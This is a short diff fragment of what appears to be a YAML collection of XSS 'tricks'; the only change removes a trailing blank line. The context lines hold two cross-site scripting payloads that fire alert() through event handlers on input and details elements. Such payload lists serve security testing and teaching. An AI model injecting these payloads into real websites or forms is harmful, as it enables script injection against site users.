@@ -45,4 +45,3 @@ tricks:
     payload: |
       <input onfocus=alert("XSS") autofocus>
       <details ontoggle=alert("XSS") open>
-
